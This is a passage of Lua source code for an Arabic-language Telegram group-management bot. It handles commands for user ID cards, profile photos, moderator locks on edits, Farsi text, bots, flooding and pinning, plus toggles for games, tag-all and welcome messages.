if text == 'الغاء' then   
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم الغاء حفظ كليشة الايدي ', 1, 'md')
faederdx1:del("FAEDER:New:id:"..bot_id..msg.chat_id_..msg.sender_user_id_)
return false
end
faederdx1:del("FAEDER:New:id:"..bot_id..msg.chat_id_..msg.sender_user_id_)
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم حفظ الكليشة الجديده ', 1, 'md')
faederdx1:set("FAEDER:faeder:id:text:"..bot_id..msg.chat_id_,text)
return false
end
if text and text:match("^حذف الايدي$") and faeder11(msg) or text and text:match("^مسح الايدي$") and faeder11(msg) then
local faeder = '↫ اهلا عزيزي  '..renk_faeder(msg)..' \n↫ تم حذف كليشة الايدي '
faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md')
faederdx1:del("FAEDER:faeder:id:text:"..bot_id..msg.chat_id_)
end end
--     By Developer Faeder     -- 
if msg.reply_to_message_id_ ~= 0 then
return ""
else 
if text and (text:match("^ايدي$") or text:match("^id$") or text:match("^Id$")) and faeder11(msg) then
function faeder(extra,result,success)
if result.username_ then username = '@'..result.username_ else username = ' لا يوجد  ' end
local function getpro(extra, result, success) 
local faeder = faederdx1:get(FAEDER..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local faedery = (faederdx1:get('faeder:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
local user_msgs = faederdx1:get(FAEDER..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local sticker = (tonumber(faederdx1:get(FAEDER.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local user_nkt = tonumber(faederdx1:get(FAEDER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)
local cont = (tonumber(faederdx1:get(FAEDER..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local msguser = tonumber(faederdx1:get(FAEDER..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_))
if result.photos_[0] then

if not faederdx1:get('FAEDER:id:mute'..msg.chat_id_) then 
if not faederdx1:get('FAEDER:id:photo'..msg.chat_id_) then
if faederdx1:get("FAEDER:faeder:id:text:"..bot_id) then 
new_idii = faederdx1:get("FAEDER:faeder:id:text:"..bot_id)
new_idii = new_idii:gsub('#username',(username or 'لا يوجد'))
new_idii = new_idii:gsub('#photos',(result.total_count_ or 'لا يوجد')) 
new_idii = new_idii:gsub('#sticker',(sticker or 'لا يوجد'))
new_idii = new_idii:gsub('#game',(user_nkt or 'لا يوجد'))
new_idii = new_idii:gsub('#cont',(cont or 'لا يوجد'))
new_idii = new_idii:gsub('#msgs',(user_msgs + faedery  or 'لا يوجد'))
new_idii = new_idii:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
new_idii = new_idii:gsub('#msgday',(faeder or 'لا يوجد'))
new_idii = new_idii:gsub('#formsg',(formsgg(msguser) or 'لا يوجد'))
new_idii = new_idii:gsub('#stast',(faeder_renk(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
else
local faeder58 = {"ي جمال ايديك بس ","يالبى الايدي"}
faederdx(msg.chat_id_, result.id_, 1,''..faeder[math.random(#faeder)]..'', 1, 'html') 
new_idii = ""..faeder[math.random(#faeder58)].."\n.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , "..username.."\n.𖣂 𝙨𝙩𝙖𝙨𝙩 , "..faeder_renk(msg.sender_user_id_, msg.chat_id_).."\n.𖣂 𝙡𝘿 , "..msg.sender_user_id_.."\n.𖣂 𝙂𝙖𝙢𝙨 , "..user_nkt.."\n.𖣂 𝙢𝙨𝙂𝙨 , "..(user_msgs + faedery).." • "..(faeder).."\n.𖣂 𝙋𝙝𝙤𝙩𝙤 , "..result.total_count_.."\n.𖣂 𝙁𝙤𝙧𝙢𝙨𝙜 , "..formsgg(msguser).."\n"
end 
if not faederdx1:get("FAEDER:faeder:id:text:"..bot_id..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,new_idii,msg.id_,msg.id_.."")
else 

local new_id = faederdx1:get("FAEDER:faeder:id:text:"..bot_id..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
local new_id = new_id:gsub('#photos',(result.total_count_ or 'لا يوجد')) 
local new_id = new_id:gsub('#sticker',(sticker or 'لا يوجد'))
local new_id = new_id:gsub('#game',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('#cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('#msgs',(user_msgs + faedery or 'لا يوجد'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('#formsg',(formsgg(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('#stast',(faeder_renk(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,new_id,msg.id_,msg.id_.."")
end else
if faederdx1:get("FAEDER:faeder:id:text:"..bot_id) then 
new_ide = faederdx1:get("FAEDER:faeder:id:text:"..bot_id)
new_ide = new_ide:gsub('#username',(username or 'لا يوجد'))
new_ide = new_ide:gsub('#photos',(result.total_count_ or 'لا يوجد')) 
new_ide = new_ide:gsub('#sticker',(sticker or 'لا يوجد'))
new_ide = new_ide:gsub('#game',(user_nkt or 'لا يوجد'))
new_ide = new_ide:gsub('#cont',(cont or 'لا يوجد'))
new_ide = new_ide:gsub('#msgs',(user_msgs + faedery or 'لا يوجد'))
new_ide = new_ide:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
new_ide = new_ide:gsub('#formsg',(formsgg(msguser) or 'لا يوجد'))
new_ide = new_ide:gsub('#stast',(faeder_renk(msg.sender_user_id_, msg.chat_id_)  or 'لا يوجد'))
else
  local faeder58 = {"ي جمال ايديك بس ","يالبى الايدي"}
  faederdx(msg.chat_id_, result.id_, 1,''..faeder[math.random(#faeder)]..'', 1, 'html') 
  new_idii = ""..faeder[math.random(#faeder58)].."\n.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , "..username.."\n.𖣂 𝙨𝙩𝙖𝙨𝙩 , "..faeder_renk(msg.sender_user_id_, msg.chat_id_).."\n.𖣂 𝙡𝘿 , "..msg.sender_user_id_.."\n.𖣂 𝙂𝙖𝙢𝙨 , "..user_nkt.."\n.𖣂 𝙢𝙨𝙂𝙨 , "..(user_msgs + faedery).." • "..(faeder).."\n.𖣂 𝙋𝙝𝙤𝙩𝙤 , "..result.total_count_.."\n.𖣂 𝙁𝙤𝙧𝙢𝙨𝙜 , "..formsgg(msguser).."\n"
end
if not faederdx1:get("FAEDER:faeder:id:text:"..bot_id..msg.chat_id_) then 
faederdx(msg.chat_id_, msg.id_, 1, new_ide, 1, 'html')
else
local new_id = faederdx1:get("FAEDER:faeder:id:text:"..bot_id..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
local new_id = new_id:gsub('#photos',(result.total_count_ or 'لا يوجد')) 
local new_id = new_id:gsub('#sticker',(sticker or 'لا يوجد'))
local new_id = new_id:gsub('#game',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('#cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('#msgs',(user_msgs + faedery or 'لا يوجد'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('#formsg',(formsgg(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('#stast',(faeder_renk(msg.sender_user_id_, msg.chat_id_)  or 'لا يوجد'))
faederdx(msg.chat_id_, msg.id_, 1, new_id, 1, 'html')
end end else
faederdx(msg.chat_id_, msg.id_, 1, '↫ الايدي معطل  ', 1, 'md')
end else  

if faederdx1:get("FAEDER:faeder:id:text:"..bot_id) then 
new_idii = faederdx1:get("FAEDER:faeder:id:text:"..bot_id)
new_idii = new_idii:gsub('#username',(username or 'لا يوجد'))
new_idii = new_idii:gsub('#photos',(result.total_count_ or 'لا يوجد')) 
new_idii = new_idii:gsub('#sticker',(sticker or 'لا يوجد'))
new_idii = new_idii:gsub('#game',(user_nkt or 'لا يوجد'))
new_idii = new_idii:gsub('#cont',(cont or 'لا يوجد'))
new_idii = new_idii:gsub('#msgs',(user_msgs + faedery or 'لا يوجد'))
new_idii = new_idii:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
new_idii = new_idii:gsub('#msgday',(faeder or 'لا يوجد'))
new_idii = new_idii:gsub('#formsg',(formsgg(msguser) or 'لا يوجد'))
new_idii = new_idii:gsub('#stast',(faeder_renk(msg.sender_user_id_, msg.chat_id_)  or 'لا يوجد'))
else
  local faeder58 = {"ي جمال ايديك بس ","يالبى الايدي"}
  faederdx(msg.chat_id_, result.id_, 1,''..faeder[math.random(#faeder)]..'', 1, 'html') 
  new_idii = ""..faeder[math.random(#faeder58)].."\n.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , "..username.."\n.𖣂 𝙨𝙩𝙖𝙨𝙩 , "..faeder_renk(msg.sender_user_id_, msg.chat_id_).."\n.𖣂 𝙡𝘿 , "..msg.sender_user_id_.."\n.𖣂 𝙂𝙖𝙢𝙨 , "..user_nkt.."\n.𖣂 𝙢𝙨𝙂𝙨 , "..(user_msgs + faedery).." • "..(faeder).."\n.𖣂 𝙋𝙝𝙤𝙩𝙤 , "..result.total_count_.."\n.𖣂 𝙁𝙤𝙧𝙢𝙨𝙜 , "..formsgg(msguser).."\n"
end
if not faederdx1:get('FAEDER:id:mute'..msg.chat_id_) then 
if not faederdx1:get('FAEDER:id:photo'..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, new_idii, 1, 'html')
else
  local faeder58 = {"ي جمال ايديك بس ","يالبى الايدي"}
  faederdx(msg.chat_id_, result.id_, 1,''..faeder[math.random(#faeder)]..'', 1, 'html') 
  new_idii = ""..faeder[math.random(#faeder58)].."\n.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , "..username.."\n.𖣂 𝙨𝙩𝙖𝙨𝙩 , "..faeder_renk(msg.sender_user_id_, msg.chat_id_).."\n.𖣂 𝙡𝘿 , "..msg.sender_user_id_.."\n.𖣂 𝙂𝙖𝙢𝙨 , "..user_nkt.."\n.𖣂 𝙢𝙨𝙂𝙨 , "..(user_msgs + faedery).." • "..(faeder).."\n.𖣂 𝙋𝙝𝙤𝙩𝙤 , "..result.total_count_.."\n.𖣂 𝙁𝙤𝙧𝙢𝙨𝙜 , "..formsgg(msguser).."\n"
end else
faederdx(msg.chat_id_, msg.id_, 1, '↫ الايدي معطل  ', 1, 'md')
end end end
tdcli_function ({
ID = "GetUserProfilePhotos",
user_id_ = msg.sender_user_id_,
offset_ = 0,
limit_ = 1 
}, getpro, nil) 
end
getUser(msg.sender_user_id_, faeder)
end end
--     By Developer Faeder     -- 
 if text == "صورتي" and not faederdx1:get(FAEDER.."lock:get:photo"..msg.chat_id_)  and faeder11(msg) then 
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,"↫ لديك "..result.total_count_.." صوره‌‏ ", msg.id_, msg.id_, "md")
else
faederdx(msg.chat_id_, msg.id_, 1, "↫ لا تمتلك صوره في حسابك  ", 1, 'md')
end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end
--     By Developer Faeder     -- 
if text and text:match("^صورتي (%d+)$") and faeder11(msg) then
local pronumb = {string.match(text, "^(صورتي) (%d+)$")}
local function gproen(extra, result, success)
if not is_momod(msg.sender_user_id_, msg.chat_id_) and faederdx1:get(FAEDER.."lock:get:photo"..msg.chat_id_)  then 
faederdx(msg.chat_id_, msg.id_, 1, '️↫ جلب الصوره الشخصيه معطل ', 1, 'md')
else
if pronumb[2] == '1' then
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, "↫ لا تمتلك صوره في حسابك  ", 1, 'md')
end
elseif pronumb[2] == '2' then
if result.photos_[1] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[1].sizes_[1].photo_.persistent_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '️↫ انت لا تمتلك الصوره التي طلبت رقمها ', 1, 'md')
end
elseif pronumb[2] == '3' then
if result.photos_[2] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[2].sizes_[1].photo_.persistent_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '️↫ انت لا تمتلك الصوره التي طلبت رقمها ', 1, 'md')
end
elseif pronumb[2] == '4' then
if result.photos_[3] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[3].sizes_[1].photo_.persistent_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '️↫ انت لا تمتلك الصوره التي طلبت رقمها ', 1, 'md')
end
elseif pronumb[2] == '5' then
if result.photos_[4] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[4].sizes_[1].photo_.persistent_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '️↫ انت لا تمتلك الصوره التي طلبت رقمها ', 1, 'md')
end
elseif pronumb[2] == '6' then
if result.photos_[5] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[5].sizes_[1].photo_.persistent_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '️↫ انت لا تمتلك الصوره التي طلبت رقمها ', 1, 'md')
end
elseif pronumb[2] == '7' then
if result.photos_[6] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[6].sizes_[1].photo_.persistent_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '️↫ انت لا تمتلك الصوره التي طلبت رقمها ', 1, 'md')
end
elseif pronumb[2] == '8' then
if result.photos_[7] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[7].sizes_[1].photo_.persistent_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '️↫ انت لا تمتلك الصوره التي طلبت رقمها ', 1, 'md')
end
elseif pronumb[2] == '9' then
if result.photos_[8] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[8].sizes_[1].photo_.persistent_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '️↫ انت لا تمتلك الصوره التي طلبت رقمها ', 1, 'md')
end
elseif pronumb[2] == '10' then
if result.photos_[9] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[9].sizes_[1].photo_.persistent_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '️↫ انت لا تمتلك الصوره التي طلبت رقمها ', 1, 'md')
end else
faederdx(msg.chat_id_, msg.id_, 1, "↫ لا يمكنني ان ارسل لك اكثر من 10 صور ", 1, 'md')
end end end
tdcli_function ({
ID = "GetUserProfilePhotos",
user_id_ = msg.sender_user_id_,
offset_ = 0,
limit_ = pronumb[2]
}, gproen, nil) 
end
--     By Developer Faeder     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then 
if text and text:match("^قفل (.*)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور '
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور '
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور '
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير '
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن '
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ '
elseif is_monsh2(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ '
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير '
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن '          
end
local lockptf = {string.match(text, "^(قفل) (.*)$")} 
if lockptf[2] == "التعديل" then
if not faederdx1:get(FAEDER..'editmsg'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← التعديل  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'editmsg'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل التعديل سابقا ', 1, 'md')
end end
if lockptf[2] == "الفارسيه" then
if not faederdx1:get(FAEDER..'farsi'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← الفارسيه  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 56, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'farsi'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل الفارسيه سابقا ', 1, 'md')
end end
if lockptf[2] == "الفارسيه بالطرد" then
if not faederdx1:get(FAEDER..'farsiban'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← الفارسيه بالطرد  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 63, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'farsiban'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل الفارسيه بالطرد سابقا ', 1, 'md')
end end
if lockptf[2] == "الشارحه" then
if not faederdx1:get(FAEDER..'bot:cmds'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← الشارحه  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'bot:cmds'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل الشارحه سابقا ', 1, 'md')
end end
if lockptf[2] == "البوتات" then
if not faederdx1:get(FAEDER..'bot:bots:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← البوتات  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'bot:bots:mute'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل البوتات سابقا ', 1, 'md')
end end
if lockptf[2] == "البوتات بالطرد" then
if not faederdx1:get(FAEDER..'bot:bots:ban'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← البوتات بالطرد  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 62, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'bot:bots:ban'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل البوتات بالطرد سابقا ', 1, 'md')
end end
if lockptf[2] == "البوتات بالتقييد" then
if not faederdx1:get(FAEDER..'keed_bots'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← البوتات بالتقييد  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 64, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'keed_bots'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل البوتات بالتقييد سابقا ', 1, 'md')
end end
if lockptf[2] == "التكرار" then
if not faederdx1:get(FAEDER..'anti-flood:'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← التكرار  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'anti-flood:'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل التكرار سابقا ', 1, 'md')
end end
if lockptf[2] == "التثبيت" then
if not faederdx1:get(FAEDER..'bot:pin:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← التثبيت  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'bot:pin:mute'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل التثبيت سابقا ', 1, 'md')
end end end end
--     By Developer Faeder     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^ضع تكرار (%d+)$") then
local floodmax = {string.match(text, "^(ضع تكرار) (%d+)$")}
if tonumber(floodmax[2]) < 2 then
faederdx(msg.chat_id_, msg.id_, 1, '↫ قم بتحديد تكرار اكبر من 2 ', 1, 'md')
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم تحديد التكرار للعدد '..floodmax[2]..' ', 1, 'md')
faederdx1:set(FAEDER..'flood:max:'..msg.chat_id_,floodmax[2])
end end 
--     By Developer Faeder     -- 
if text and text:match("^ضع التكرار (.*)$") then
local status = {string.match(text, "^(ضع التكرار) (.*)$")}
if status[2] == "بالطرد" then
if faederdx1:get(FAEDER..'floodstatus'..msg.chat_id_) == "Kicked" then
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم وضع التكرار بالطرد فعلا ', 1, 'md')
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم وضع التكرار بالطرد ', 1, 'md')
faederdx1:set(FAEDER..'floodstatus'..msg.chat_id_,'Kicked')
end end
if status[2] == "بالمسح" then
if faederdx1:get(FAEDER..'floodstatus'..msg.chat_id_) == "DelMsg" then
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم وضع التكرار بالمسح فعلا ', 1, 'md')
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم وضع التكرار بالمسح ', 1, 'md')
faederdx1:set(FAEDER..'floodstatus'..msg.chat_id_,'DelMsg')
end end end
--     By Developer Faeder     -- 
if text and text:match("^ضع الفارسيه (.*)$") then
local status = {string.match(text, "^(ضع الفارسيه) (.*)$")}
if status[2] == "بالتحذير" then
if faederdx1:get(FAEDER..'far'..msg.chat_id_) == "thhhh" then
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم وضع الفارسيه بالتحذير فعلا ', 1, 'md')
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم وضع الفارسيه بالتحذير ', 1, 'md')
faederdx1:set(FAEDER..'far'..msg.chat_id_,'thhhh')
end end
if status[2] == "بدون تحذير" then
if faederdx1:get(FAEDER..'far'..msg.chat_id_) == "bedthhh" then
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم وضع الفارسيه بدون تحذير فعلا ', 1, 'md')
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم وضع الفارسيه بدون تحذير ', 1, 'md')
faederdx1:set(FAEDER..'far'..msg.chat_id_,'bedthhh')
end end end
--     By Developer Faeder     -- 
if (text and text == 'تفعيل الايدي بالصوره') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'ضع الايدي بالصوره') and is_owner(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
if not faederdx1:get('FAEDER:id:photo'..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم وضع الايدي بالصوره فعلا ', 1, 'md')
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم وضع الايدي بالصوره ', 1, 'md')
faederdx1:del('FAEDER:id:photo'..msg.chat_id_)
end end
if (text and text == 'تعطيل الايدي بالصوره') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'ضع الايدي بدون صوره') and is_owner(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
if faederdx1:get('FAEDER:id:photo'..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم وضع الايدي بدون صوره فعلا ', 1, 'md')
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم وضع الايدي بدون صوره ', 1, 'md')
faederdx1:set('FAEDER:id:photo'..msg.chat_id_,true)
 end end
 --     By Developer Faeder     -- 
if (text and text == 'تفعيل الايدي') and is_owner(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
if not faederdx1:get('FAEDER:id:mute'..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم تفعيل الايدي سابقا ', 1, 'md')
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم تفعيل الايدي ', 1, 'md')
faederdx1:del('FAEDER:id:mute'..msg.chat_id_)
 end end
if (text and text == 'تعطيل الايدي') and is_owner(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
if faederdx1:get('FAEDER:id:mute'..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم تعطيل الايدي سابقا ', 1, 'md')
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم تعطيل الايدي ', 1, 'md')
faederdx1:set('FAEDER:id:mute'..msg.chat_id_,true)
 end end
 if (text and text == 'تفعيل اللعبه') and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) or (text and text == 'تفعيل الالعاب') and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
if not faederdx1:get(FAEDER..'bot:lock_geam'..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم تفعيل الالعاب سابقا ', 1, 'md')
else
faederdx(msg.chat_id_, msg.id_, 1,[[*
↫ اهلا بك في قائمه الالعاب ↓↓
         ───────────────
↫ الالعاب المتوفره بالبوت ↓↓
         ───────────────
↫ ارسل امر { تخمين } لبدء لعبه
↫ ارسل امر { كت تويت } لبدء لعبه
↫ ارسل امر { ترتيب } لبدء لعبه 
↫ ارسل امر { سمايلات } لبدء لعبه 
↫ ارسل امر { حزوره } لبدء لعبه 
↫ ارسل امر { المعاني } لبدء لعبه 
↫ ارسل امر { العكس } لبدء لعبه 
↫ ارسل امر { المحيبس } لبدء لعبه 
↫ ارسل امر { امثله } لبدء لعبه 
↫ ارسل امر { المختلف } لبدء لعبه 
↫ ارسل امر { انقليزي } لبدء لعبه 
↫ ارسل امر { رياضيات } لبدء لعبه 
         ───────────────
↫ قناة السورس *[@badboy_here] 
]], 1, 'md')
faederdx1:del(FAEDER..'bot:lock_geam'..msg.chat_id_)
 end end
if (text and text == 'تعطيل اللعبه') and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) or (text and text == 'تعطيل الالعاب') and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
if faederdx1:get(FAEDER..'bot:lock_geam'..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم تعطيل الالعاب سابقا ', 1, 'md')
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم تعطيل الالعاب ', 1, 'md')
faederdx1:set(FAEDER..'bot:lock_geam'..msg.chat_id_,true)
 end end
 
 
 if (text and text == 'تفعيل تاك الكل') and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
if not faederdx1:get(FAEDER..'bot:lock_tag'..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم تفعيل تاك الكل سابقا ', 1, 'md')
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم تفعيل تاك الكل ', 1, 'md')
faederdx1:del(FAEDER..'bot:lock_tag'..msg.chat_id_)
 end end
if (text and text == 'تعطيل تاك الكل') and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
if faederdx1:get(FAEDER..'bot:lock_tag'..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم تعطيل تاك الكل سابقا ', 1, 'md')
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم تعطيل تاك الكل ', 1, 'md')
faederdx1:set(FAEDER..'bot:lock_tag'..msg.chat_id_,true)
 end end
--     By Developer Faeder     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text == 'ضع رابط' or text == 'وضع رابط' or text == 'ضع الرابط' or text == 'وضع الرابط' then
faederdx(msg.chat_id_, msg.id_, 1, '↫ ارسل رابط المجموعه ليتم حفظه ', 1, 'md')
faederdx1:setex(FAEDER.."bot:setgroup:link"..msg.chat_id_..""..msg.sender_user_id_,300,true) 
end
--     By Developer Faeder     -- 
if text == "الدعم" or text == "المطور" and faeder11(msg) then
local link = faederdx1:get(FAEDER.."bot:supports:link")
if link then
if link:match("https://") then
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم ارسال بياناتك للمطور \n↫ يمكنك طلب المساعدة من قروب الدعم \n↫ رابط قروب دعم البوت \n         ───────────────\n " .. link, 1, "html")
else
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم ارسال بياناتك للمطور \n↫ يمكنك طلب المساعدة من بوت التواصل \n↫ معرف بوت تواصل المطور \n         ───────────────\n @" .. link, 1, "html")
end end end
--     By Developer Faeder     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^تفعيل الترحيب$") and faeder11(msg) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم تفعيل الترحيب ', 1, 'md')
faederdx1:set(FAEDER.."bot:welcome"..msg.chat_id_,true)
end
if text and text:match("^تعطيل الترحيب$") and faeder11(msg) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم تعطيل الترحيب ', 1, 'md')
faederdx1:del(FAEDER.."bot:welcome"..msg.chat_id_)
end
if faederdx1:get(FAEDER..'add:welcome'..msg.chat_id_..':'..msg.sender_user_id_) then 
